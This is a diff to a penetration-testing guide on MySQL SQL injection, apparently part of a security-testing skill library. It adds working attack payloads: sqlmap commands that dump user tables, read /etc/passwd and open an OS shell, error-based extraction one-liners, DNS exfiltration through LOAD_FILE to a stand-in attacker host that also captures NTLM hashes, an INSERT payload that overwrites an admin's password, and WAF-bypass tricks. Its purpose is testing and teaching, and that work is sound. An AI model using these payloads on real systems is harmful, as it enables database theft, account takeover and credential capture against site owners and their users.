@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-02: "MySQL Injection grants INSERT/UPDATE access to write an unsanitized script payload directly into a stored field, achieving persistent Stored XSS against every user who views the record = Critical (Mass Account Compromise)"
 ---
 
 # wstg-inpv-05.2
@@ -411,6 +412,89 @@ sqlmap -u "https://target.com/product?id=1" --dbms=mysql --technique=T  # Time-b
 
 ---
 
+## Example Commands/Payloads
+
+### Detection (curl)
+
+```bash
+TARGET="https://target.com/product"
+
+# MySQL-specific error trigger
+curl -s "$TARGET?id=1'" | grep -Ei "you have an error in your sql syntax|mysql_fetch|mysqli"
+
+# Version fingerprint via UNION (comment style differs by version: -- vs #)
+curl -s "$TARGET?id=1 UNION SELECT @@version,NULL,NULL-- -"
+curl -s "$TARGET?id=1 UNION SELECT @@version,NULL,NULL%23"
+
+# Time-based blind (native SLEEP())
+time curl -s "$TARGET?id=1' AND SLEEP(5)-- -" -o /dev/null
+
+# Boolean-based blind
+curl -s "$TARGET?id=1' AND 1=1-- -" | wc -c
+curl -s "$TARGET?id=1' AND 1=2-- -" | wc -c
+```
+
+### SQLMap (MySQL)
+
+```bash
+sqlmap -u "https://target.com/product?id=1" --dbms=mysql --banner
+sqlmap -u "https://target.com/product?id=1" --dbms=mysql --dbs
+sqlmap -u "https://target.com/product?id=1" --dbms=mysql -D target_db -T users --dump
+sqlmap -u "https://target.com/product?id=1" --dbms=mysql --file-read=/etc/passwd
+sqlmap -u "https://target.com/product?id=1" --dbms=mysql --os-shell           # requires FILE priv + secure_file_priv writable
+sqlmap -u "https://target.com/product?id=1" --dbms=mysql --technique=T        # force time-based only
+```
+
+### Error-Based One-Liners (data forced into the error message)
+
+```sql
+' AND GTID_SUBSET(CONCAT('~',(SELECT @@version),'~'),1337)-- -
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT @@version),'~')) USING utf8)))-- -
+' AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT @@version),'~'))-- -
+' AND UPDATEXML(1337,CONCAT('.','~',(SELECT @@version),'~'),31337)-- -
+' AND (SELECT * FROM (SELECT NAME_CONST(@@version,1),NAME_CONST(@@version,1)) x)-- -
+```
+
+### DNS Exfiltration (Out-of-Band, requires FILE privilege)
+
+```sql
+-- Leak @@version (or any sub-select) via a DNS lookup instead of the HTTP response
+SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker-collab.net\\a'));
+-- UNC path variant also captures the connecting host's NTLMv2 hash if intercepted with responder
+SELECT LOAD_FILE('\\\\attacker-collab.net\\share');
+```
+
+### Authenticated Write via Stacked INSERT (`ON DUPLICATE KEY UPDATE`)
+
+If the injection point is an `INSERT ... VALUES (...)` (e.g. a registration form), this abuses the unique-key conflict to silently overwrite an existing admin's password:
+
+```sql
+attacker_dummy@example.com", "P@ssw0rd"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
+```
+
+### WAF Bypass Specific to MySQL
+
+```sql
+-- Alternative to information_schema.tables (often blocklisted) - requires access to mysql db
+SELECT * FROM mysql.innodb_table_stats;
+
+-- Scientific notation obfuscates keywords/dots to dodge signature-based WAFs
+1' or 1.e(1) or '1'='1
+```
+
+### Detection Pattern
+
+| Signal | Meaning |
+| ------ | ------- |
+| `You have an error in your SQL syntax` / `mysql_fetch_array()` / `mysqli_query()` in response | Error-based SQLi, confirms MySQL backend |
+| `-- -` (with trailing space) works but bare `--` fails | MySQL requires a character after `--` to treat it as a comment |
+| Response delayed exactly N seconds for `SLEEP(N)` payload | Time-based blind SQLi |
+| `LOAD_FILE('/etc/passwd')` returns file contents in response/UNION column | FILE privilege granted, arbitrary file read confirmed |
+| DNS lookup for `<extracted-value>.attacker-collab.net` received | OOB exfiltration via `LOAD_FILE(UNC path)` confirmed, works even with a fully blind response |
+| `information_schema.tables` blocked by WAF but `mysql.innodb_table_stats` returns table names | WAF signature bypass via alternative metadata source |
+
+---
+
 ## Remediation
 
 ```php
@@ -452,6 +536,13 @@ cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
 | ---------- | ------------- |
 | **CWE-89** | SQL Injection |
 
+---
+
+## References
+
+- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
+- [PortSwigger SQL Injection Cheat Sheet - MySQL](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [PayloadsAllTheThings - SQL Injection (MySQL)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#mysql)
 
 ---
 
